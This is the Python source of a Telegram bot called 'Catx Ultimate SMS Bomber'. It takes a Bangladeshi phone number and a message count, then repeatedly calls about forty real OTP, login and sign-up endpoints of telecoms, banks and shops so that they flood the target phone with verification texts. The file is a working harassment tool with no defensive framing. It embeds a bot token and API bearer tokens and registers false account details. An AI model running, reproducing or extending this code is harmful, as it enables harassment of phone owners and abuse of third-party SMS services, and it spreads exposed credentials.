import os
import logging
import threading
import requests
import json
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Replace with your actual bot token
BOT_TOKEN = "8084384189:AAGdXyDI0K3jOcKTmLxOPap-BhEmtxfO44M"

# Conversation states
PHONE, COUNT = range(2)

# Global variables for bombing control
bombing_active = False
bombing_thread = None
messages_sent = 0
target_phone = ""
sms_count = 0
chat_id = None

# Keyboard layouts
main_keyboard = ReplyKeyboardMarkup(
    [
        [KeyboardButton("📱 SMS Bomber")],
        [KeyboardButton("📞 Contact Dev")]
    ],
    resize_keyboard=True
)

stop_keyboard = ReplyKeyboardMarkup(
    [
        [KeyboardButton("⛔ Stop Bombing")]
    ],
    resize_keyboard=True
)

# API configurations
def get_apis(mobile):
    return [
        # Fast APIs
        {
            "url": f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=880{mobile[1:]}&lang=en&ng=0",
            "method": "get",
            "headers": {}
        },
        {
            "url": f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={mobile}",
            "method": "get",
            "headers": {}
        },
        
        # New APIs from the list
        {
            "url": f"https://developer.quizgiri.xyz/api/v2.0/send-otp?phone={mobile}&country_code=+880&fcm_token=null",
            "method": "post",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"http://lpin.dev.mpower-social.com:6001/usermodule/otp_mobile/?mobile_no={mobile}&email=xbomber_public%40gmail.com&verification_type=registration",
            "method": "get",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "http://27.131.15.19/lstyle/api/lsotprequest",
            "method": "post",
            "body": json.dumps({"shortcode": "2494905", "msisdn": f"88{mobile}"}),
            "headers": {"content-type": "application/json", "content-length": "48"}
        },
        {
            "url": f"http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-{mobile}/operator-All/send",
            "method": "get",
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber",
            "method": "post",
            "body": json.dumps({
                "AccessToken": "",
                "TrackingNo": "",
                "mobileNo": mobile,
                "otpSms": "",
                "product_id": "250",
                "requestChannel": "MOB",
                "trackingStatus": 5
            }),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn=88{mobile}",
            "method": "post",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"http://45.114.85.19:8080/v3/otp/send?msisdn=88{mobile}",
            "method": "get",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"http://apibeta.iqra-live.com/api/v2/sent-otp/{mobile}",
            "method": "get",
            "headers": {"x-user-channel": "apps"}
        },
        {
            "url": "https://shop.shajgoj.com/wp-admin/admin-ajax.php",
            "method": "post",
            "body": f"action=xoo_ml_login_with_otp&xoo-ml-phone-login={mobile}&xoo-ml-form-token=4840&xoo-ml-form-type=login_user_with_otp&redirect=%2Fmy-account%2F",
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://api.eat-z.com/auth/customer/signin",
            "method": "post",
            "body": json.dumps({"username": f"+88{mobile}"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://aleshacard.com/api/register-otp?contact_no={mobile}",
            "method": "post",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://themallbd.com/api/auth/otp_login",
            "method": "post",
            "body": json.dumps({"phone_number": f"+88{mobile}"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://win.fundesh.com.bd/authSrv/auth/generateOtp",
            "method": "post",
            "body": json.dumps({"msisdn": mobile, "clientId": "d2c_client"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88{mobile}",
            "method": "post",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "http://vstg-gateway-prod-1532961163.ap-south-1.elb.amazonaws.com/notification/api/v1/send/otp/v3",
            "method": "post",
            "body": json.dumps({"mobileNumber": f"88{mobile}", "countryId": 22}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.ajkerdeal.com/Recover/RetrivePassword/customersignup=null",
            "method": "post",
            "body": json.dumps({"CustomerId": "01833268701", "MobileOrEmail": mobile, "Type": 2}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.arogga.com/v1/auth/sms/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0",
            "method": "post",
            "body": f"mobile=+88{mobile}&fcmToken=&referral=",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api-2.osudpotro.com/api/v1/users/send_otp",
            "method": "post",
            "body": json.dumps({"mobile": f"+88-{mobile}", "deviceToken": "web", "language": "en", "os": "web"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://shop.shajgoj.com/wp-admin/admin-ajax.php",
            "method": "post",
            "body": f"action=xoo_ml_login_with_otp&xoo-ml-phone-login={mobile}&xoo-ml-form-token=3563&xoo-ml-form-type=login_user_with_otp&redirect=%2Fmy-account%2F%3Ffbclid%3DIwAR2mUXNZgDYWrrONUqp61_3Ac4vtnaZUUcBUVwFVTjqgymp5x_2i0nULH_k",
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "http://nesco.sslwireless.com/api/v1/login",
            "method": "post",
            "body": f"phone_number={mobile}",
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://webapi.robi.com.bd/v1/send-otp",
            "method": "post",
            "body": json.dumps({"phone_number": mobile}),
            "headers": {
                "content-type": "application/json",
                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3dlYmFwaS5yb2JpLmNvbS5iZC92MS90b2tlbiIsImlhdCI6MTY1Mjk2MTAyOSwiZXhwIjoxNjUzMDQ3NDI5LCJuYmYiOjE2NTI5NjEwMjksImp0aSI6IjBXSW9ld0U3bzFJRVNHTVUiLCJzdWIiOiJSb2JpV2ViU2l0ZSJ9.lxP2K3WU36mO8By_dNiVO3VYOSajRofD-Rhqb-0y8ok"
            }
        },
        {
            "url": "https://shop.shajgoj.com/wp-admin/admin-ajax.php",
            "method": "post",
            "body": f"action=xoo_ml_login_with_otp&xoo-ml-phone-login={mobile}&xoo-ml-form-token=3490&xoo-ml-form-type=login_user_with_otp&redirect=%252Fmy-account%252F&=",
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://api.bongo-solutions.com/auth/api/login/send-otp",
            "method": "post",
            "body": json.dumps({"operator": "all", "msisdn": f"88{mobile}"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{mobile}",
            "method": "post",
            "headers": {
                "content-type": "application/json",
                "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"
            }
        },
        {
            "url": "https://edge.ali2bd.com/api/consumer/v1/auth/login",
            "method": "post",
            "body": json.dumps({"username": f"+88{mobile}"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": f"https://www.sineorbiz.com/wp-content/plugins/bkash.php?phone={mobile}",
            "method": "get",
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP",
            "method": "post",
            "body": json.dumps({"mobile": mobile}),
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://api.osudpotro.com/api/v1/users/send_otp",
            "method": "post",
            "body": json.dumps({"mobile": f"+88{mobile}", "deviceToken": "web", "language": "en", "os": "web"}),
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://api.shopoth.com/shop/api/v1/otps/send",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
            "method": "post",
            "body": json.dumps({
                "requestType": "send",
                "phoneNumber": f"+88{mobile}",
                "emailConsent": True,
                "whatsappConsent": True
            }),
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
            "method": "post",
            "body": json.dumps({
                "full_name": "BLACKFIRE",
                "company_name": "Bomber",
                "email_address": "blactfiretools@gmail.com",
                "phone_number": mobile
            }),
            "headers": {"content-type": "application/json"}
        },
        # Original APIs
        {
            "url": "https://webloginda.grameenphone.com/backend/api/v1/otp",
            "method": "post",
            "body": json.dumps({"msisdn": f"880{mobile[1:]}"}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.osudpotro.com/api/v1/users/send_otp",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://api.apex4u.com/api/auth/login",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
        {
            "url": "https://bb-api.bohubrihi.com/public/activity/otp",
            "method": "post",
            "body": json.dumps({"phone": mobile}),
            "headers": {"content-type": "application/json"}
        },
    ]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨,\n"
        "✨ 𝐂𝐚𝐭𝐱 𝐔𝐥𝐭𝐢𝐦𝐚𝐭𝐞 𝗦𝗠𝗦 𝗕𝗼𝗺𝗯𝗲𝗿 𝗕𝗼𝘁 🖤\n\n"
        "𝙽𝚘𝚝 𝚌𝚘𝚍𝚎𝚍 𝚝𝚘 𝚒𝚖𝚙𝚛𝚎𝚜𝚜. 𝙲𝚘𝚍𝚎𝚍 𝚝𝚘 𝚎𝚡𝚙𝚛𝚎𝚜𝚜.\n"
        "~𝙲𝚊𝚝𝚇 🖤\n\n"
        "𝗗𝗘𝗩: @mueidmursalinrifat\n\n"
        "👉 𝐂𝐡𝐨𝐨𝐬𝐞 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧 𝐛𝐞𝐥𝐨𝐰 𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞:",
        reply_markup=main_keyboard
    )
async def contact_dev(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👨‍💻 Developer Contact:\n\n"
        "📧 Telegram: @mueidmursalinrifat\n"
        "💼 Contract If Need Any Help\n"
        ,
        reply_markup=main_keyboard
    )

async def sms_bomber(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bombing_active, chat_id
    if bombing_active:
        await update.message.reply_text(
            "⚠️ Bombing is already in progress. Stop it first to start a new one.",
            reply_markup=stop_keyboard
        )
        return
    
    chat_id = update.effective_chat.id
    await update.message.reply_text(
        "📱 Please enter the Bangladeshi phone number (01XXXXXXXXX):"
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_phone
    phone = update.message.text.strip()
    
    if phone.startswith("01") and len(phone) == 11 and phone.isdigit():
        target_phone = phone
        await update.message.reply_text(
            "🔢 Please enter the number of SMS to send:"
        )
        return COUNT
    else:
        await update.message.reply_text(
            "❌ Invalid format! Please enter a valid Bangladeshi number (01XXXXXXXXX):"
        )
        return PHONE

async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global sms_count, bombing_active, bombing_thread, chat_id
    
    try:
        count = int(update.message.text.strip())
        if count <= 0:
            await update.message.reply_text(
                "❌ Please enter a positive number:"
            )
            return COUNT
        
        sms_count = count
        bombing_active = True
        chat_id = update.effective_chat.id
        
        await update.message.reply_text(
            f"🚀 Starting SMS bombing to {target_phone}\n"
            f"📊 Target: {sms_count} messages\n\n"
            "⛔ Use the stop button to cancel anytime",
            reply_markup=stop_keyboard
        )
        
        # Start bombing in a separate thread
        bombing_thread = threading.Thread(target=start_bombing, args=(context,))
        bombing_thread.start()
        
        return ConversationHandler.END
        
    except ValueError:
        await update.message.reply_text(
            "❌ Please enter a valid number:"
        )
        return COUNT

async def stop_bombing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bombing_active, messages_sent
    
    if bombing_active:
        bombing_active = False
        await update.message.reply_text(
            f"⛔ Bombing stopped!\n"
            f"📊 Total messages sent: {messages_sent}",
            reply_markup=main_keyboard
        )
    else:
        await update.message.reply_text(
            "ℹ️ No active bombing session to stop.",
            reply_markup=main_keyboard
        )

async def send_progress_update(context: ContextTypes.DEFAULT_TYPE, message: str):
    """Send progress update to the user"""
    try:
        await context.bot.send_message(chat_id=chat_id, text=message)
    except Exception as e:
        logger.error(f"Error sending progress update: {e}")

def start_bombing(context: ContextTypes.DEFAULT_TYPE):
    global bombing_active, messages_sent, target_phone, sms_count, chat_id
    
    full_number = "880" + target_phone[1:]
    messages_sent = 0
    half_sent = False  # Track if half message has been sent
    
    # Get all APIs
    apis = get_apis(target_phone)
    
    while bombing_active and (sms_count == 0 or messages_sent < sms_count):
        try:
            # Process each API
            for api in apis:
                if not bombing_active:
                    break
                    
                try:
                    if api["method"].lower() == "get":
                        response = requests.get(api["url"], headers=api.get("headers", {}), timeout=5)
                    else:
                        body = api.get("body", "")
                        response = requests.post(api["url"], data=body, headers=api.get("headers", {}), timeout=5)
                    
                    if response.status_code in [200, 201, 202]:
                        messages_sent += 1
                        
                except requests.exceptions.RequestException:
                    # Skip API if it fails
                    continue

            # Send progress update when half messages are sent
            if sms_count > 0 and not half_sent and messages_sent >= sms_count // 2:
                half_sent = True
                context.application.create_task(
                    send_progress_update(
                        context, 
                        f"📊 Halfway there! \n✅ {messages_sent}/{sms_count} messages sent\n🚀 Continuing bombing..."
                    )
                )

            # Check if we've reached the target count
            if sms_count > 0 and messages_sent >= sms_count:
                bombing_active = False
                context.application.create_task(
                    send_progress_update(
                        context,
                        f"✅ Bombing completed!\n📊 Total messages sent: {messages_sent}\n🎯 Target was: {sms_count}",
                    )
                )
                # Also send with main keyboard
                context.application.create_task(
                    context.bot.send_message(
                        chat_id=chat_id,
                        text="Operation completed! 🎉",
                        reply_markup=main_keyboard
                    )
                )
                break
                
        except Exception as e:
            logger.error(f"Error in bombing: {e}")
    
    bombing_active = False

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Operation cancelled.",
        reply_markup=main_keyboard
    )
    return ConversationHandler.END

def main():
    # Create the Application
    application = Application.builder().token(BOT_TOKEN).build()

    # Add conversation handler for SMS bombing
    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^📱 SMS Bomber$"), sms_bomber)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_handler)
    application.add_handler(MessageHandler(filters.Regex("^📞 Contact Dev$"), contact_dev))
    application.add_handler(MessageHandler(filters.Regex("^⛔ Stop Bombing$"), stop_bombing))

    # Start the bot
    print("🤖 Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()